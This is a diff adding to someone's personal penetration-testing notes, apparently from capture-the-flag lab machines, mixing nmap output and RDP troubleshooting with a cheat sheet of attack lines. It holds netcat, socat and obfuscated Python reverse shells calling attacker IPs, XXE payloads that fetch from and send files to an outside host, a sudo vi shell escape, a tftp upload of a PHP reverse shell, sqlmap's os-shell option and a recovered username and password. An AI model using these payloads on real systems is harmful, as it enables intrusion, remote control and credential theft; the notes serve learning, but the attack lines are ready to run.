@@ -501,3 +501,110 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.189 1234 >/tmp/f
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.15.189/xmlShell.xml"> ]>
 
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+	
+	
+	
+
+* Nmap results
+
+```
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown
+```
+
+* Banner Grab  
+
+```
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+```
+
+* So the problem was with the certificate. When I use `xfreerdp /v:[IP ADDRESS] /cert:ignore /u:Administrator`. 
+* First off, we use Administrator instead of root in Windows machines.
+* Second, I should've looked more into the flags or switches or whatever they call them. Anyway, it wouldn't have occured to me that I have to ignore the cert or that this was an option or that if I put it it will be functional.
+
+```
+[03:25:50:543] [2009:2010] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
+[03:25:50:543] [2009:2010] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
+[03:25:50:883] [2009:2010] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
+[03:25:50:918] [2009:2010] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
+[03:25:50:918] [2009:2010] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
+[03:25:50:214] [2009:2010] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
+[03:25:50:214] [2009:2010] [WARN][com.freerdp.crypto] - CN = Explosion
+
+```
+
+
+PLEASE COMBINE THIS FILE WITH HELPFUL SHIT   
+
+* we can copy the request into a file and then put the file in `sqlmap` as follows if we're suspecting an sql injection  
+
+```console
+sqlmap -r [FILE NAME]
+```
+
+* We can also use the switch/option/flag `--os-shell` to get a shell from the sql injection.
+
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.189 1234 >/tmp/f
+
+socat exec:'bash -li',pty,stderr,setsid,sane tcp:10.10.15.189:4444
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+P@s5w0rd!
+
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf :set shell=/bin/sh
+:shell
+
+* To scan for UDP ports with nmap write the following `sudo nmap -Pn -sV -sU 10.129.126.250 `
+
+* `.htpasswd` this file is used for basic HTTP authentication.
+* The local file inclusion vul in the http service allowed me to access the `.htpasswd` file which, it seems, contains usernames and password. Indeed, it did contain the username and password of a user named Mike. I'll try and ssh with them. Damn just remembered there's no ssh on the host.
+mike:Sheffield19
+
+
+tftp 10.129.132.172 -m binary -c put revShell.php revShell.php
+
+* It seems like I will be making a container so that I can open it with root privilege.  
+
+[[Linux]]
+	
+	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.15.189/test2.php"> ]>
+	
+	<!DOCTYPE foo [  
+
+<!ELEMENT foo (#ANY)>
+
+<!ENTITY xxe SYSTEM "https://10.10.15.189/test.php">]><foo>&xxe;</foo>
+	
+	
+	
+	<!DOCTYPE root [<!ENTITY steal SYSTEM "php://filter/convert.base64-encode/resource=//10.10.15.189/WhatEver">]>
+	
+<root><name>test</name><tel>021212</tel><email>&steal;</email><password>pwd</password></root>‌
+	
+	
+	* Try to use the repeater in Burp suite it save sooo much time
+	* How to use rsa id to ssh  
+	
+	ssh -i id_rsa daniel@10.129.140.196
